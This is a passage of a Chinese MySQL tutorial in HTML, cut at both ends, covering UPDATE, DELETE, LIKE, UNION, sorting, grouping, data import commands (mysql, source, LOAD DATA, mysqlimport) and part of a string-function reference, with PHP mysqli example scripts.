mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;UPDATE runoob_tbl</span><br><span class="line">        SET runoob_title=&quot;学习 Python&quot;</span><br><span class="line">        WHERE runoob_id=3&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法更新数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据更新成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="delete子句"><a href="#delete子句" class="headerlink" title="delete子句"></a>delete子句</h4><p>SQL 的 DELETE FROM 命令来删除 MySQL 数据表中的记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; DELETE FROM runoob_tbl WHERE runoob_id=3;</span><br><span class="line">Query OK, 1 row affected (0.23 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;DELETE FROM runoob_tbl</span><br><span class="line">        WHERE runoob_id=3&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法删除数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据删除成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="like子句"><a href="#like子句" class="headerlink" title="like子句"></a>like子句</h4><p>使用 WHERE…LIKE 子句来从MySQL数据表 runoob_tbl 中读取数据。</p><p>这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</p><p>SQL LIKE 子句中使用百分号 **%**字符来表示任意字符，类似于UNIX或正则表达式中的星号 *****。</p><p>如果没有使用百分号 <strong>%</strong>, LIKE 子句与等号 <strong>=</strong> 的效果是一样的。</p><p>以下是我们将 runoob_tbl 表中获取 runoob_author 字段中以 COM为结尾的的所有记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT * from runoob_tbl  WHERE runoob_author LIKE &#x27;%COM&#x27;;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        WHERE runoob_author LIKE &quot;%COM&quot;&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT country FROM Websites</span><br><span class="line">UNION</span><br><span class="line">SELECT country FROM apps</span><br><span class="line">ORDER BY country;</span><br></pre></td></tr></table></figure><p><img src="image-20211227142757263.png" alt="image-20211227142757263"></p><h5 id="union-all"><a href="#union-all" class="headerlink" title="union all"></a>union all</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT country FROM Websites</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT country FROM apps</span><br><span class="line">ORDER BY country;</span><br></pre></td></tr></table></figure><p><img src="image-20211227143024149.png" alt="image-20211227143024149"></p><h4 id="where-的unionall"><a href="#where-的unionall" class="headerlink" title="where 的unionall"></a>where 的unionall</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT country, name FROM Websites</span><br><span class="line">WHERE country=&#x27;CN&#x27;</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT country, app_name FROM apps</span><br><span class="line">WHERE country=&#x27;CN&#x27;</span><br><span class="line">ORDER BY country;</span><br></pre></td></tr></table></figure><p><img src="image-20211227143051407.png" alt="image-20211227143051407"></p><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>order by </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT * from runoob_tbl ORDER BY submission_date ASC;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">| 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT * from runoob_tbl ORDER BY submission_date DESC;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        ORDER BY  submission_date ASC&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL ORDER BY 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><p>group by</p><p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p><p>在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set names utf8;</span><br><span class="line">mysql&gt; SELECT * FROM employee_tbl;</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | signin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  1 | 小明 | 2016-04-22 15:25:33 |      1 |</span><br><span class="line">|  2 | 小王 | 2016-04-20 15:25:47 |      3 |</span><br><span class="line">|  3 | 小丽 | 2016-04-19 15:26:02 |      2 |</span><br><span class="line">|  4 | 小王 | 2016-04-07 15:26:14 |      4 |</span><br><span class="line">|  5 | 小明 | 2016-04-11 15:26:40 |      4 |</span><br><span class="line">|  6 | 小明 | 2016-04-04 15:26:54 |      2 |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name, COUNT(*) FROM   employee_tbl GROUP BY name;</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 小丽 |        1 |</span><br><span class="line">| 小明 |        3 |</span><br><span class="line">| 小王 |        2 |</span><br><span class="line">+--------+----------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>with rollup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name, SUM(signin) as signin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------+--------------+</span><br><span class="line">| name   | signin_count |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| 小丽 |            2 |</span><br><span class="line">| 小明 |            7 |</span><br><span class="line">| 小王 |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+--------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>coalesce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT coalesce(name, &#x27;总数&#x27;), SUM(signin) as signin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| coalesce(name, &#x27;总数&#x27;) | signin_count |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| 小丽                   |            2 |</span><br><span class="line">| 小明                   |            7 |</span><br><span class="line">| 小王                   |            7 |</span><br><span class="line">| 总数                   |           16 |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><h1 id="MySQL-导入数据"><a href="#MySQL-导入数据" class="headerlink" title="MySQL 导入数据"></a>MySQL 导入数据</h1><p>本章节我们为大家介绍几种简单的 MySQL 导入数据命令。</p><hr><h2 id="1、mysql-命令导入"><a href="#1、mysql-命令导入" class="headerlink" title="1、mysql 命令导入"></a>1、mysql 命令导入</h2><p>使用 mysql 命令导入语法格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名    -p密码    &lt;  要导入的数据库数据(runoob.sql)</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mysql -uroot -p123456 &lt; runoob.sql</span><br></pre></td></tr></table></figure><p>以上命令将将备份的整个数据库 runoob.sql 导入。</p><hr><h2 id="2、source-命令导入"><a href="#2、source-命令导入" class="headerlink" title="2、source 命令导入"></a>2、source 命令导入</h2><p>source 命令导入数据库需要先登录到数库终端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database abc;      # 创建数据库</span><br><span class="line">mysql&gt; use abc;                  # 使用已创建的数据库 </span><br><span class="line">mysql&gt; set names utf8;           # 设置编码</span><br><span class="line">mysql&gt; source /home/abc/abc.sql  # 导入备份数据库</span><br></pre></td></tr></table></figure><hr><h2 id="3、使用-LOAD-DATA-导入数据"><a href="#3、使用-LOAD-DATA-导入数据" class="headerlink" title="3、使用 LOAD DATA 导入数据"></a>3、使用 LOAD DATA 导入数据</h2><p>MySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; INTO TABLE mytbl;</span><br></pre></td></tr></table></figure><p>　如果指定LOCAL关键词，则表明从客户主机上按路径读取文件。如果没有指定，则文件在服务器上按路径读取文件。</p><p>你能明确地在LOAD DATA语句中指出列值的分隔符和行尾标记，但是默认标记是定位符和换行符。</p><p>两个命令的 FIELDS 和 LINES 子句的语法是一样的。两个子句都是可选的，但是如果两个同时被指定，FIELDS 子句必须出现在 LINES 子句之前。</p><p>如果用户指定一个 FIELDS 子句，它的子句 （TERMINATED BY、[OPTIONALLY] ENCLOSED BY 和 ESCAPED BY) 也是可选的，不过，用户必须至少指定它们中的一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; INTO TABLE mytbl</span><br><span class="line">  -&gt; FIELDS TERMINATED BY &#x27;:&#x27;</span><br><span class="line">  -&gt; LINES TERMINATED BY &#x27;\r\n&#x27;;</span><br></pre></td></tr></table></figure><p>LOAD DATA 默认情况下是按照数据文件中列的顺序插入数据的，如果数据文件中的列与插入表中的列不一致，则需要指定列的顺序。</p><p>如，在数据文件中的列顺序是 a,b,c，但在插入表的列顺序为b,c,a，则数据导入语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; LOAD DATA LOCAL INFILE &#x27;dump.txt&#x27; </span><br><span class="line">    -&gt; INTO TABLE mytbl (b, c, a);</span><br></pre></td></tr></table></figure><hr><h2 id="4、使用-mysqlimport-导入数据"><a href="#4、使用-mysqlimport-导入数据" class="headerlink" title="4、使用 mysqlimport 导入数据"></a>4、使用 mysqlimport 导入数据</h2><p>mysqlimport 客户端提供了 LOAD DATA INFILEQL 语句的一个命令行接口。mysqlimport 的大多数选项直接对应 LOAD DATA INFILE 子句。</p><p>从文件 dump.txt 中将数据导入到 mytbl 数据表中, 可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlimport -u root -p --local mytbl dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure><p>mysqlimport 命令可以指定选项来设置指定格式,命令语句格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlimport -u root -p --local --fields-terminated-by=&quot;:&quot; \</span><br><span class="line">   --lines-terminated-by=&quot;\r\n&quot;  mytbl dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure><p>mysqlimport 语句中使用 –columns 选项来设置列的顺序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mysqlimport -u root -p --local --columns=b,c,a \</span><br><span class="line">    mytbl dump.txt</span><br><span class="line">password *****</span><br></pre></td></tr></table></figure><hr><h2 id="mysqlimport的常用选项介绍"><a href="#mysqlimport的常用选项介绍" class="headerlink" title="mysqlimport的常用选项介绍"></a>mysqlimport的常用选项介绍</h2><table><thead><tr><th align="left">选项</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">-d or –delete</td><td align="left">新数据导入数据表中之前删除数据数据表中的所有信息</td></tr><tr><td align="left">-f or –force</td><td align="left">不管是否遇到错误，mysqlimport将强制继续插入数据</td></tr><tr><td align="left">-i or –ignore</td><td align="left">mysqlimport跳过或者忽略那些有相同唯一 关键字的行， 导入文件中的数据将被忽略。</td></tr><tr><td align="left">-l or -lock-tables</td><td align="left">数据被插入之前锁住表，这样就防止了， 你在更新数据库时，用户的查询和更新受到影响。</td></tr><tr><td align="left">-r or -replace</td><td align="left">这个选项与－i选项的作用相反；此选项将替代 表中有相同唯一关键字的记录。</td></tr><tr><td align="left">–fields-enclosed- by= char</td><td align="left">指定文本文件中数据的记录时以什么括起的， 很多情况下 数据以双引号括起。 默认的情况下数据是没有被字符括起的。</td></tr><tr><td align="left">–fields-terminated- by=char</td><td align="left">指定各个数据的值之间的分隔符，在句号分隔的文件中， 分隔符是句号。您可以用此选项指定数据之间的分隔符。 默认的分隔符是跳格符（Tab）</td></tr><tr><td align="left">–lines-terminated- by=str</td><td align="left">此选项指定文本文件中行与行之间数据的分隔字符串 或者字符。 默认的情况下mysqlimport以newline为行分隔符。 您可以选择用一个字符串来替代一个单个的字符： 一个新行或者一个回车。</td></tr></tbody></table><p>mysqlimport 命令常用的选项还有 -v 显示版本（version）， -p 提示输入密码（password）等。</p><h1 id="MySQL-函数"><a href="#MySQL-函数" class="headerlink" title="MySQL 函数"></a>MySQL 函数</h1><p>MySQL 有很多内置的函数，以下列出了这些函数的说明。</p><hr><h2 id="MySQL-字符串函数"><a href="#MySQL-字符串函数" class="headerlink" title="MySQL 字符串函数"></a>MySQL 字符串函数</h2><table><thead><tr><th align="left">函数</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">ASCII(s)</td><td align="left">返回字符串 s 的第一个字符的 ASCII 码。</td><td align="left">返回 CustomerName 字段第一个字母的 ASCII 码：<code>SELECT ASCII(CustomerName) AS NumCodeOfFirstChar FROM Customers;</code></td></tr><tr><td align="left">CHAR_LENGTH(s)</td><td align="left">返回字符串 s 的字符数</td><td align="left">返回字符串 RUNOOB 的字符数<code>SELECT CHAR_LENGTH(&quot;RUNOOB&quot;) AS LengthOfString; </code></td></tr><tr><td align="left">CHARACTER_LENGTH(s)</td><td align="left">返回字符串 s 的字符数</td><td align="left">返回字符串 RUNOOB 的字符数<code>SELECT CHARACTER_LENGTH(&quot;RUNOOB&quot;) AS LengthOfString; </code></td></tr><tr><td align="left">CONCAT(s1,s2…sn)</td><td align="left">字符串 s1,s2 等多个字符串合并为一个字符串</td><td align="left">合并多个字符串<code>SELECT CONCAT(&quot;SQL &quot;, &quot;Runoob &quot;, &quot;Gooogle &quot;, &quot;Facebook&quot;) AS ConcatenatedString; </code></td></tr><tr><td align="left">CONCAT_WS(x, s1,s2…sn)</td><td align="left">同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符</td><td align="left">合并多个字符串，并添加分隔符：<code>SELECT CONCAT_WS(&quot;-&quot;, &quot;SQL&quot;, &quot;Tutorial&quot;, &quot;is&quot;, &quot;fun!&quot;)AS ConcatenatedString; </code></td></tr><tr><td align="left">FIELD(s,s1,s2…)</td><td align="left">返回第一个字符串 s 在字符串列表(s1,s2…)中的位置</td><td align="left">返回字符串 c 在列表值中的位置：<code>SELECT FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;); </code></td></tr><tr><td align="left">FIND_IN_SET(s1,s2)</td><td align="left">返回在字符串s2中与s1匹配的字符串的位置</td><td align="left">返回字符串 c 在指定字符串中的位置：<code>SELECT FIND_IN_SET(&quot;c&quot;, &quot;a,b,c,d,e&quot;); </code></td></tr><tr><td align="left">FORMAT(x,n)</td><td align="left">函数可以将数字 x 进行格式化 “#,###.##”, 将 x 保留到小数点后 n 位，最后一位四舍五入。</td><td align="left">格式化数字 “#,###.##” 形式：<code>SELECT FORMAT(250500.5634, 2);     -- 输出 250,500.56 </code></td></tr><tr><td align="left">INSERT(s1,x,len,s2)</td><td align="left">字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</td><td align="left">从字符串第一个位置开始的 6 个字符替换为 runoob：<code>SELECT INSERT(&quot;google.com&quot;, 1, 6, &quot;runoob&quot;);  -- 输出：runoob.com </code></td></tr><tr><td align="left">LOCATE(s1,s)</td><td align="left">从字符串 s 中获取 s1 的开始位置</td><td align="left">获取 b 在字符串 